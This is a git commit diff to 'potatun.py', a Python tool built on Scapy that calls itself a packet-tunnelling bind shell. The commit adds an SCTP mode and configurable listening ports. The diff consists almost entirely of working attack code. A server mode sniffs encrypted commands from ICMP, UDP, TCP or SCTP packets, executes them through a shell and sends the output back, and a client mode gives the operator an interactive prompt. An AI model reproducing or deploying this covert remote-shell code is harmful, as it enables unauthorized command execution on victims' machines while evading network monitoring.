abdfd38d374892a14fd4c76409d009ce35cedcbe
Potato-Industries <56988989+Potato-Industries@users.noreply.github.com>
2019-12-15 02:23:49 +0000

    added SCTP, fixed issue with setting listening port

--- potatun.py
+++ potatun.py
@@ -11,6 +11,7 @@ from Crypto.Cipher import ARC2
 import os
 import base64
 import time
+import random
 import datetime
 import hashlib
 import argparse
@@ -47,6 +48,20 @@ def stopICMP(x):
 def listenICMP(intface):
   data = sniff(iface=str(intface), filter="icmp", stop_filter=stopICMP)
   return decrypt(data[len(data)-1][Raw].load).decode('utf-8')
+
+def throwSCTP(cmd, ip, port, intface):
+  data = IP(dst=ip)/SCTP(sport=random.randint(50000,60000), dport=int(port))/SCTPChunkData(data=encrypt(cmd))
+  send(data, iface=str(intface), verbose=True)
+
+def stopSCTP(x):
+  if SCTP in x and SCTPChunkData in x:
+    return True
+  else:
+    return False
+
+def listenSCTP(intface, port):
+  data = sniff(iface=str(intface), filter="sctp and dst port " + str(port), stop_filter=stopSCTP)
+  return decrypt(data[0][SCTPChunkData].data).decode('utf-8')
   
 def throwTCP(cmd, ip, port, intface):
   with ProgressBar(title="Sending TCPs..") as pb:
@@ -62,8 +77,8 @@ def stopTCP(x):
   else:
     return False
 
-def listenTCP(intface):
-  pkts = sniff(iface=str(intface), filter='tcp and dst port 443', stop_filter=stopTCP)
+def listenTCP(intface, port):
+  pkts = sniff(iface=str(intface), filter="tcp and dst port "+str(port), stop_filter=stopTCP)
   o = ""
   for pkt in pkts:
     if pkt[TCP].sport == 59999:
@@ -88,8 +103,8 @@ def stopUDP(x):
   else:
     return False
 
-def listenUDP(intface):
-  pkts = sniff(iface=intface, filter='udp and dst port 443', stop_filter=stopUDP)
+def listenUDP(intface, port):
+  pkts = sniff(iface=intface, filter="udp and dst port "+str(port), stop_filter=stopUDP)
   o = ""
   for pkt in pkts:
     if pkt[UDP].sport == 59999:
@@ -112,7 +127,7 @@ def main(intface, ip, port, mode):
         cmd = session.prompt('# ', style=our_style)
         throwUDP(cmd, ip, port, intface)
         time.sleep(1)
-        print(HTML("<ansired><b>" + listenUDP(intface) + "</b></ansired>"))
+        print(HTML("<ansired><b>" + listenUDP(intface, port) + "</b></ansired>"))
         time.sleep(1)
       except KeyboardInterrupt:
         break
@@ -122,7 +137,7 @@ def main(intface, ip, port, mode):
 
   elif mode == "udp-s":
     while True:
-      cmd = listenUDP(intface)
+      cmd = listenUDP(intface, port)
       data = shellExec(cmd)
       time.sleep(1)
       throwUDP(data, ip, port, intface)
@@ -133,7 +148,7 @@ def main(intface, ip, port, mode):
         cmd = session.prompt('# ', style=our_style)
         throwTCP(cmd, ip, port, intface)
         time.sleep(1)
-        print(HTML("<ansired><b>" + listenTCP(intface) + "</b></ansired>"))
+        print(HTML("<ansired><b>" + listenTCP(intface, port) + "</b></ansired>"))
         time.sleep(1)
       except KeyboardInterrupt:
         break
@@ -143,7 +158,7 @@ def main(intface, ip, port, mode):
 
   elif mode == "tcp-s":
     while True:
-      cmd = listenTCP(intface)
+      cmd = listenTCP(intface, port)
       data = shellExec(cmd)
       time.sleep(1)
       throwTCP(data, ip, port, intface)
@@ -168,11 +183,31 @@ def main(intface, ip, port, mode):
       time.sleep(1)
       throwICMP(data, ip, intface)
 
+  elif mode == "sctp-c":
+    while True:
+      try:
+        cmd = session.prompt('# ', style=our_style)
+        throwSCTP(cmd, ip, port, intface)
+        print(HTML("<ansired><b>" + listenSCTP(intface, port) + "</b></ansired>"))
+        time.sleep(1)
+      except KeyboardInterrupt:
+        break
+      except EOFError:
+        break
+    print('Exiting..')
+
+  elif mode == "sctp-s":
+    while True:
+      cmd = listenSCTP(intface, port)
+      data = shellExec(cmd)
+      time.sleep(1)
+      throwSCTP(data, ip, port, intface)
+
 if __name__ == "__main__":
   parser = argparse.ArgumentParser(description='potatun - an experimental packet tunnelling bind shell.')
-  parser.add_argument('-i', type=str, help='send interface (e.g. eth0)')
-  parser.add_argument('-t', type=str, help='send ip:port (e.g. 10.10.10.1:443)')
-  parser.add_argument('-m', type=str, help='tunnel mode (udp-c/udp-s or tcp-c/tcp-s or icmp-c/icmp-s)')
+  parser.add_argument('-i', type=str, help='send interface (eth0)')
+  parser.add_argument('-t', type=str, help='send ip:port (10.10.10.1:443)')
+  parser.add_argument('-m', type=str, help='tunnel mode (udp-c/udp-s, tcp-c/tcp-s, icmp-c/icmp-s, sctp-c/sctp-s)')
   args = parser.parse_args()
   if args.i and args.t and args.m:
     print("> Sending/Listening on: " + args.i)
